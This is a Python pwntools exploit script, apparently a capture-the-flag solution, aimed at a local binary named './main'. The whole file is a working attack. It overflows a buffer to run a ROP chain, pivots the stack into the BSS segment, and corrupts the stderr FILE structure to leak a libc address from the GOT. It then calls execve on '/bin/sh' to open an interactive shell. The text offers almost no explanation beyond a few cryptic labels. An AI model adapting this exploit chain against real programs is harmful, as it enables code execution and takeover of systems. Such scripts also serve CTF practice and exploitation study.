from pwn import *
from time import sleep


# PLT functions
fgets_plt=0x400520
main=0x400668
entry=0x400550
vuln=0x400645
gift=0x0000000000400637
flush_main=0x00000000004006df

#GADGETS
pop_rdi=0x0000000000400763
ret=0x000000000040050e
pop_rsi_r15=0x0000000000400761
pop_rbp=0x00000000004005b8
leave_ret=0x0000000000400666


#BSS & GOT
stderr=0x601040
bss=0x601040
fgets_got=0x0000000000600fd8

period=0.2
sec_pivot=bss+0x900

#context.log_level="error"
p=process("./main")
payload=""
payload+="A"*18

payload+=p64(pop_rdi)
payload+=p64(stderr-8)
payload+=p64(pop_rsi_r15)
payload+=p64(8)
payload+=p64(0)
payload+=p64(gift)
payload+=p64(fgets_plt) # A

payload+=p64(pop_rdi)
payload+=p64(stderr+8)
payload+=p64(pop_rsi_r15)
payload+=p64(0x200)
payload+=p64(0)
payload+=p64(gift)
payload+=p64(fgets_plt) # flush stdin 

payload+=p64(pop_rdi)
payload+=p64(stderr+8)
payload+=p64(pop_rsi_r15)
payload+=p64(0x200)
payload+=p64(0)
payload+=p64(gift)
payload+=p64(fgets_plt) # B


payload+=p64(pop_rdi)
payload+=p64(sec_pivot)
payload+=p64(pop_rsi_r15)
payload+=p64(0x200)
payload+=p64(0)
payload+=p64(gift)
payload+=p64(fgets_plt) # C


payload+=p64(pop_rbp)
payload+=p64(stderr-16)
payload+=p64(leave_ret)

p.sendline(payload) # jaweb main

sleep(period)
p.sendline(p64(pop_rdi)) # jaweb A
sleep(period)

payload=""
payload+=p64(pop_rbp)
payload+=p64(sec_pivot-8)
payload+=p64(leave_ret)

p.sendline(payload) # jaweb B
sleep(period)

payload=""
payload+=p64(pop_rsi_r15)
payload+=p64(8*6)
payload+=p64(0)
payload+=p64(gift)
payload+=p64(fgets_plt) # D
payload+=p64(flush_main)
payload+=p64(vuln)
payload+=p64(vuln)*2
p.sendline(payload) # jaweb C

payload=""
payload+=p64(0xfbad1800)
payload+=p64(0)
payload+=p64(0)
payload+=p64(0)
payload+=p64(fgets_got)
payload+=p64(fgets_got+8)
p.sendline(payload) # jaweb D

data=u64(p.recv())

base=data-0x000000000007eb90
execve=base+0x00000000000e4e90
binsh=base+0x1b40fa
pop_rdx_libc=base+0x0000000000001b96
pop_rsi_libc=base+0x0000000000023e8a
print "leak :",hex(data)
print "base :",hex(base)
print "execve :",hex(execve)
print "binsh :",hex(binsh)

payload=""
payload+="A"*18
payload+=p64(pop_rdi)
payload+=p64(binsh)
payload+=p64(pop_rsi_libc)
payload+=p64(0)
payload+=p64(pop_rdx_libc)
payload+=p64(0)
payload+=p64(execve)
p.sendline(payload)
p.interactive()















